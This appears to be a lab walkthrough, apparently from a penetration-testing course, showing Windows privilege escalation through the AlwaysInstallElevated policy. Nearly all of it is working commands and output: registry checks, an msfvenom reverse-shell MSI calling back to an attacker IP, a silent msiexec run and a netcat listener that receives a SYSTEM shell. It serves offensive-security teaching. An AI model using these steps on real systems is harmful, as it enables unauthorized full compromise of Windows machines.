# Always install privs

### Enumerating Always Install Elevated Settings

Let's enumerate this setting.

Miscellaneous Techniques

```powershell
PS C:\htb> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1

```

Miscellaneous Techniques

```powershell
PS C:\htb> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1

```

Our enumeration shows us that the `AlwaysInstallElevated` key exists, so the policy is indeed enabled on the target system.

### Generating MSI Package

We can exploit this by generating a malicious `MSI` package and execute it via the command line to obtain a reverse shell with SYSTEM privileges.

Miscellaneous Techniques

```
doshim@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of msi file: 159744 bytes

```

### Executing MSI Package

We can upload this MSI file to our target, start a Netcat listener and execute the file from the command line like so:

Miscellaneous Techniques

```
C:\htb> msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart

```

### Catching Shell

If all goes to plan, we will receive a connection back as `NT AUTHORITY\SYSTEM`.

Miscellaneous Techniques

```
doshim@htb[/htb]$ nc -lnvp 9443listening on [any] 9443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.33] 49720
Microsoft Windows [Version 10.0.18363.592]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami

whoami
nt authority\system

```